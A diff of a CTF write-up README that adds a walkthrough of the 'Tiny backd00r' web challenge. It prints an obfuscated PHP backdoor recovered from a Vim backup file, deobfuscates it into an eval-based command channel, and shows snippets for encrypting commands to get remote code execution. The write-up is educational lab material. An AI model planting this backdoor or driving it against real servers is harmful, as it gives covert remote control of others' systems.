@@ -49,6 +49,7 @@ dumped the database and got username of admin: ``admin`` and his password as pla
 back to login form and loggin in and holaaa here is the flag :  ````IEEE{Sch3ma0xa46480_is_Aw3some}````
 
 
+
 ### [2- Web : S3cure uploader - 200 points](https://github.com/D4rkTT/IEEE-Olympics-CTF-Writeups#)
 here we have simple file uploader and we got source code
 ```php
@@ -117,3 +118,77 @@ so now we have 1000 filenames as md5 hash
 so back to burp intruder and paste my list on payload list and start attack and wait 200 response code and holaaaa we got web shell uploaded :D
 and now we can get flag inside flag.php file :D
 
+
+### [3- Web : Tiny backd00r - 200 points](https://github.com/D4rkTT/IEEE-Olympics-CTF-Writeups#)
+here we have simple website with index.php that contains `Can you hackme!` nothing else
+i tried to brutforce another scripts name with dirsearch tools but no result
+back to hints we have 2 hints
+1- `You should never trust the files left behind editors!`
+2- `Vim backup files are always dangrous.`
+
+so we should find vim backup file that should be index.php~ but 404 notfound :"(
+so i guessed the file name `backdoor.php` and hola 200ok but empty response so i tried to get vim backup of it `backdoor.php~` and holaaa we got source code
+but WTF is that xD
+```php
+<?php
+$F=',$i++){gMgM$ogM.=$t{$i}^$k{$jgM};}}returngMgM $o;}if(gM@preg_gMmatch("/$gMkgMh(.+)$gMkf/gM",@file_get_congMtents(gM"gMphp';
+$Y=str_replace('p','','crpepatppe_fupnctpion');
+$a='$k=gM"094db03gMgM6";$kh="7gMefgM9bf383gMded";$kf="gMb241egM2ed9d4a";gM$p="wa1YvgMgM8JoMtD0QJO9gMgM";functiongM x($';
+$V='tgM_contents(gM);@ob_gMend_gMclean();$r=gM@gMbasgMe64_encode(gM@x(@gzcomgMgMpress($o)gM,$k));prigMntgM("$gMp$kh$r$kf");}';
+$Q='t,$gMk)gM{gM$c=gMstrlen($k);$l=sgMtrlegMgMn($t);$o="";for($igM=0;$i<$gMl;){fogMrgM($j=0gM;($j<$c&&gM$gMi<$l);$j++gM';
+$M=':gM//input")gMgM,$m)==1){@ogMb_start();@gMevagMl(@gzugMncompresgMs(@x(@bgMase64_dgMecogMde($m[1])gM,$kgM))gM);$o=@obgM_ge';
+$h=str_replace('gM','',$a.$Q.$F.$M.$V);
+$l=$Y('',$h);$l();
+?>
+```
+its easy to make it easy to read by print `$h`
+and after some modifications we have this source code
+```php
+<?php
+$k="094db036";
+$kh="7ef9bf383ded";
+$kf="b241e2ed9d4a";
+$p="wa1Yv8JoMtD0QJO9";
+function x($t,$k){
+    $c=strlen($k);
+    $l=strlen($t);$
+    o="";
+    for($i=0;$i<$l;){
+        for($j=0;($j<$c&&$i<$l);$j++,$i++){
+            $o.=$t{$i}^$k{$j};
+        }
+    }
+    return $o;
+}
+
+if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){
+    @ob_start();
+    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+    $o=@ob_get_contents();
+    @ob_end_clean();
+    $r=@base64_encode(@x(@gzcompress($o),$k));
+    print("$p$kh$r$kf");
+}
+```
+after some analysis i found that script check for php input with regex exp.
+
+so if input have and text between `$kh` and `$kf` ("7ef9bf383ded" and "b241e2ed9d4a") then script will extract this string then decode it as base64 then pass it to `x function` to decrypt it then gzuncompress it then pass the result to `eval` function :D
+
+then get the result then gzcompress it then decrypt it with `x function` then encode the result as base64 then print it in response between `$p` & `$kh` and `$kf`
+so i wrote simple php script to do all this sh!t xD
+
+my script get payload from GET input and encrypt it using
+```php
+$cmd_encoded = base64_encode(x(gzcompress($_GET['payload']),$k));
+```
+then put it between `$kh` and `$kf` values then send this request to challenge server
+
+and get the response and decrypt it using
+```php
+$result_decoded = gzuncompress(x(base64_decode($result),$k));
+```
+
+then print the result after filtering it from `$kf` & `$kh` and `$p` values
+
+now let's try this payload : `system("ls");`
+and holaaaa we have RCE now and u can read the flag in `s3cret_flag.php` file :D
